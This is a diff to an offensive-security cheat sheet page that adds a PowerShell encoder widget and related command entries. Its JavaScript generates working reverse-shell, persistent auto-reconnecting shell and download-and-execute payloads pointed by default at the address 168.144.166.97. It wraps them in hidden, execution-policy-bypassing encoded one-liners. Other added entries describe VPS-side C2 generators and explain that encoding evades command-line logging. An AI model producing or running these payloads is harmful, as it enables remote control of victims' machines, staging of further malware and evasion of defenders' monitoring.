@@ -231,6 +231,149 @@
   <div class="sub">CSEC OPS // PERSONAL CHEAT SHEET</div>
 </div>
 
+<!-- PS ENCODER/DECODER TOOL -->
+<div style="max-width:800px;margin:0 auto 24px;background:#0d1117;border:2px solid #00f0ff;padding:20px;font-size:0.75rem;">
+  <div style="color:#00f0ff;font-size:1rem;margin-bottom:12px;text-shadow:0 0 10px rgba(0,240,255,0.5);">
+    POWERSHELL ENCODER / DECODER
+  </div>
+  <div style="color:#888;font-size:0.65rem;margin-bottom:16px;">
+    Encode commands for -EncodedCommand (-enc) or decode existing payloads. UTF-16LE Base64.
+  </div>
+
+  <div style="display:flex;gap:10px;margin-bottom:12px;">
+    <button id="encBtn" onclick="setEncMode('encode')" style="flex:1;padding:8px;background:#00f0ff;color:#000;border:none;font-family:inherit;cursor:pointer;font-weight:bold;">ENCODE</button>
+    <button id="decBtn" onclick="setEncMode('decode')" style="flex:1;padding:8px;background:transparent;color:#00f0ff;border:1px solid #00f0ff;font-family:inherit;cursor:pointer;">DECODE</button>
+  </div>
+
+  <div style="margin-bottom:8px;">
+    <label style="color:#888;font-size:0.6rem;">INPUT:</label>
+    <textarea id="encInput" placeholder="Enter PowerShell command to encode..." style="width:100%;height:80px;background:#000;color:#00ff41;border:1px solid #333;padding:10px;font-family:'Share Tech Mono',monospace;font-size:0.7rem;resize:vertical;"></textarea>
+  </div>
+
+  <div style="display:flex;gap:10px;margin-bottom:12px;">
+    <button onclick="processEncode()" style="flex:1;padding:10px;background:#00ff41;color:#000;border:none;font-family:inherit;cursor:pointer;font-weight:bold;">CONVERT</button>
+    <button onclick="copyEncOutput()" style="padding:10px 20px;background:transparent;color:#00f0ff;border:1px solid #00f0ff;font-family:inherit;cursor:pointer;">COPY</button>
+    <button onclick="clearEnc()" style="padding:10px 20px;background:transparent;color:#ff2a6d;border:1px solid #ff2a6d;font-family:inherit;cursor:pointer;">CLEAR</button>
+  </div>
+
+  <div style="margin-bottom:8px;">
+    <label style="color:#888;font-size:0.6rem;">OUTPUT:</label>
+    <textarea id="encOutput" readonly style="width:100%;height:60px;background:#000;color:#ffee00;border:1px solid #333;padding:10px;font-family:'Share Tech Mono',monospace;font-size:0.7rem;resize:vertical;"></textarea>
+  </div>
+
+  <div id="oneliner" style="display:block;">
+    <label style="color:#888;font-size:0.6rem;">ONE-LINER:</label>
+    <textarea id="encOneliner" readonly style="width:100%;height:40px;background:#000;color:#ff6b35;border:1px solid #333;padding:10px;font-family:'Share Tech Mono',monospace;font-size:0.65rem;resize:vertical;"></textarea>
+  </div>
+
+  <div style="margin-top:12px;padding-top:12px;border-top:1px solid #333;">
+    <div style="color:#888;font-size:0.6rem;margin-bottom:8px;">QUICK GENERATE:</div>
+    <div style="display:flex;gap:8px;flex-wrap:wrap;">
+      <button onclick="genShell()" style="padding:6px 12px;background:transparent;color:#00ff41;border:1px solid #00ff41;font-family:inherit;cursor:pointer;font-size:0.6rem;">Reverse Shell</button>
+      <button onclick="genPersist()" style="padding:6px 12px;background:transparent;color:#ff6b35;border:1px solid #ff6b35;font-family:inherit;cursor:pointer;font-size:0.6rem;">Persistent Shell</button>
+      <button onclick="genDownload()" style="padding:6px 12px;background:transparent;color:#00f0ff;border:1px solid #00f0ff;font-family:inherit;cursor:pointer;font-size:0.6rem;">Download+Exec</button>
+    </div>
+    <div style="margin-top:8px;">
+      <input id="genIP" placeholder="IP (default: 168.144.166.97)" style="width:180px;background:#000;color:#00f0ff;border:1px solid #333;padding:6px;font-family:inherit;font-size:0.65rem;">
+      <input id="genPort" placeholder="Port (default: 4444)" style="width:120px;background:#000;color:#00f0ff;border:1px solid #333;padding:6px;font-family:inherit;font-size:0.65rem;">
+    </div>
+  </div>
+</div>
+<!-- END ENCODER -->
+
+<script>
+let encMode = 'encode';
+
+function setEncMode(mode) {
+  encMode = mode;
+  document.getElementById('encBtn').style.background = mode === 'encode' ? '#00f0ff' : 'transparent';
+  document.getElementById('encBtn').style.color = mode === 'encode' ? '#000' : '#00f0ff';
+  document.getElementById('decBtn').style.background = mode === 'decode' ? '#00f0ff' : 'transparent';
+  document.getElementById('decBtn').style.color = mode === 'decode' ? '#000' : '#00f0ff';
+  document.getElementById('oneliner').style.display = mode === 'encode' ? 'block' : 'none';
+  document.getElementById('encInput').placeholder = mode === 'encode'
+    ? 'Enter PowerShell command to encode...'
+    : 'Enter base64 encoded string to decode...';
+}
+
+function utf16leEncode(str) {
+  const buf = new ArrayBuffer(str.length * 2);
+  const view = new Uint16Array(buf);
+  for (let i = 0; i < str.length; i++) {
+    view[i] = str.charCodeAt(i);
+  }
+  return btoa(String.fromCharCode(...new Uint8Array(buf)));
+}
+
+function utf16leDecode(b64) {
+  try {
+    const raw = atob(b64);
+    const buf = new Uint8Array(raw.length);
+    for (let i = 0; i < raw.length; i++) {
+      buf[i] = raw.charCodeAt(i);
+    }
+    const view = new Uint16Array(buf.buffer);
+    return String.fromCharCode(...view);
+  } catch (e) {
+    return 'ERROR: Invalid base64 string';
+  }
+}
+
+function processEncode() {
+  const input = document.getElementById('encInput').value;
+  if (!input.trim()) return;
+
+  if (encMode === 'encode') {
+    const encoded = utf16leEncode(input);
+    document.getElementById('encOutput').value = encoded;
+    document.getElementById('encOneliner').value = 'powershell -ep bypass -w hidden -enc ' + encoded;
+  } else {
+    const decoded = utf16leDecode(input.trim());
+    document.getElementById('encOutput').value = decoded;
+  }
+}
+
+function copyEncOutput() {
+  const output = document.getElementById(encMode === 'encode' ? 'encOneliner' : 'encOutput');
+  navigator.clipboard.writeText(output.value);
+  output.style.borderColor = '#00ff41';
+  setTimeout(() => output.style.borderColor = '#333', 500);
+}
+
+function clearEnc() {
+  document.getElementById('encInput').value = '';
+  document.getElementById('encOutput').value = '';
+  document.getElementById('encOneliner').value = '';
+}
+
+function getIP() { return document.getElementById('genIP').value || '168.144.166.97'; }
+function getPort() { return document.getElementById('genPort').value || '4444'; }
+
+function genShell() {
+  const ip = getIP(), port = getPort();
+  const script = `$c=New-Object Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$r=New-Object IO.StreamReader($s);$w.AutoFlush=$true;$w.WriteLine("[+] $env:USERNAME@$env:COMPUTERNAME");while($c.Connected){$cmd=$r.ReadLine();if(!$cmd){break};try{$o=iex $cmd 2>&1|Out-String}catch{$o=$_.ToString()};$w.WriteLine($o)};$c.Close()`;
+  document.getElementById('encInput').value = script;
+  setEncMode('encode');
+  processEncode();
+}
+
+function genPersist() {
+  const ip = getIP(), port = getPort();
+  const script = `$ip="${ip}";$port=${port};while($true){try{$c=New-Object Net.Sockets.TCPClient($ip,$port);$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$r=New-Object IO.StreamReader($s);$w.AutoFlush=$true;$w.WriteLine("[+] $env:COMPUTERNAME\\$env:USERNAME | PID: $PID");while($c.Connected){$cmd=$r.ReadLine();if(!$cmd){break};if($cmd -eq "exit"){$c.Close();break};try{$o=iex $cmd 2>&1|Out-String;$w.WriteLine($o.TrimEnd());$w.WriteLine("<<END>>")}catch{$w.WriteLine("ERROR: $_");$w.WriteLine("<<END>>")}};$c.Close()}catch{};Start-Sleep -Seconds 10}`;
+  document.getElementById('encInput').value = script;
+  setEncMode('encode');
+  processEncode();
+}
+
+function genDownload() {
+  const ip = getIP(), port = document.getElementById('genPort').value || '8889';
+  const script = `IEX(IWR http://${ip}:${port}/shell.ps1 -UseBasicParsing)`;
+  document.getElementById('encInput').value = script;
+  setEncMode('encode');
+  processEncode();
+}
+</script>
+
 <!-- QUICK START PLAYBOOK -->
 <div style="max-width:800px;margin:0 auto 24px;background:#0d1117;border:2px solid #00ff41;padding:20px;font-size:0.75rem;">
   <div style="color:#00ff41;font-size:1rem;margin-bottom:12px;text-shadow:0 0 10px rgba(0,255,65,0.5);">
@@ -3864,6 +4007,51 @@ const COMMANDS = [
     code: "Get-Service WinRM | Select Status\nnetstat -an | findstr 5985",
     tags: ["ps", "lateral", "recon"],
     accent: "#00f0ff"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // POWERSHELL ENCODER/DECODER - Base64 -enc format
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[ENCODER] PowerShell Encode Command",
+    desc: "Encode any command to base64 for -EncodedCommand (-enc). UTF-16LE format. Use the interactive tool above for quick encoding.",
+    code: "# PowerShell:\n$cmd = 'YOUR_COMMAND_HERE'\n[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))\n\n# Python (VPS):\n/opt/encode.py encode 'whoami'\n\n# Example: whoami -> dwBoAG8AYQBtAGkA",
+    tags: ["ps", "evasion", "reference"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[ENCODER] PowerShell Decode Base64",
+    desc: "Decode -enc base64 back to plaintext. Useful for analyzing payloads.",
+    code: "# PowerShell:\n[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('BASE64_HERE'))\n\n# Python (VPS):\n/opt/encode.py decode 'dwBoAG8AYQBtAGkA'\n\n# Example: dwBoAG8AYQBtAGkA -> whoami",
+    tags: ["ps", "evasion", "reference"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[ENCODER] Generate Reverse Shell",
+    desc: "Generate encoded persistent reverse shell one-liner. Auto-reconnects every 10 seconds.",
+    code: "# On VPS:\n/opt/generate.py -i 168.144.166.97 -p 4444 --oneliner\n\n# Output:\npowershell -ep bypass -w hidden -enc IwAgAFAAZQByAHMAaQBz...",
+    tags: ["linux", "vps", "c2", "evasion"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[ENCODER] Generate Download+Exec",
+    desc: "Generate encoded IEX(IWR) one-liner for staging payloads.",
+    code: "# On VPS:\n/opt/generate.py -i 168.144.166.97 -p 8889 -t download_exec -f shell.ps1 --oneliner\n\n# Output:\npowershell -ep bypass -w hidden -enc SQBFAF...",
+    tags: ["linux", "vps", "c2", "evasion"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "[ENCODER] Run Encoded Command",
+    desc: "Execute an encoded payload on target. -w hidden hides window, -ep bypass skips execution policy.",
+    code: "powershell -ep bypass -w hidden -enc BASE64_HERE",
+    tags: ["ps", "evasion"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[ENCODER] Why Use -enc?",
+    desc: "Benefits of encoded commands: bypasses command-line logging, hides payload from casual inspection, avoids quote escaping issues.",
+    code: "# BENEFITS:\n# 1. Bypasses most command-line logging\n# 2. Hides payload content from Event 4688\n# 3. No quote escaping needed\n# 4. -w hidden hides PowerShell window\n\n# DETECTION:\n# Still logged in PowerShell Script Block Logging (4104)\n# Base64 with 'powershell' is suspicious to EDR\n# Use with other evasion techniques",
+    tags: ["reference", "evasion"],
+    accent: "#607d8b"
   },
   // ═══════════════════════════════════════════════════════════════
   // SHELLCHAIN C2 - Port 5555 (landing), 5700-5799 (migration), 8888 (web), 9999 (CLI)
